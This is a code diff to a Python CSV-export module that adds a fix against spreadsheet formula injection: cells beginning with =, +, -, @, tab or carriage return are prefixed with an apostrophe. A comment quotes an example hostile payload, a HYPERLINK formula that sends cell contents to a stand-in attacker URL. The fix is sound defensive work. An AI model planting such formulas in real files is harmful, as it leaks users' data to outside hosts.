@@ -218,6 +218,25 @@ def _load_jsonl(path: Path) -> list[dict[str, Any]]:
     return rows
 
 
+# L2 fix: CSV-injection escape.  Excel / Sheets / LibreOffice will parse
+# a cell whose first non-space character is in this set as a FORMULA.
+# Operators copy these CSVs into spreadsheets, so any user-authored text
+# (thesis, reflection_text, mistake_tags, etc.) is a vector for hostile
+# inputs like ``=HYPERLINK("https://attacker/?ex="&A2,"click")``.  Prefix
+# such cells with a single apostrophe — the OWASP-recommended mitigation.
+_CSV_INJECTION_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _neutralize_csv_cell(value: Any) -> Any:
+    """Render a value for CSV output, neutralising formula-injection."""
+    if value is None or isinstance(value, (int, float, bool)):
+        return value
+    text = str(value)
+    if text and text[0] in _CSV_INJECTION_PREFIXES:
+        return "'" + text
+    return text
+
+
 def _enforce_advisory(row: dict[str, Any], headers: list[str]) -> dict[str, Any]:
     """Return a copy of row with advisory fields enforced, projected to headers."""
     projected = {h: row.get(h, "") for h in headers}
@@ -235,6 +254,9 @@ def _enforce_advisory(row: dict[str, Any], headers: list[str]) -> dict[str, Any]
                 projected["leverage"] = float(raw)
             except (TypeError, ValueError):
                 projected["leverage"] = 1.0
+    # L2: neutralise every text cell before it reaches csv.DictWriter.
+    for key in list(projected.keys()):
+        projected[key] = _neutralize_csv_cell(projected[key])
     return projected
 
 
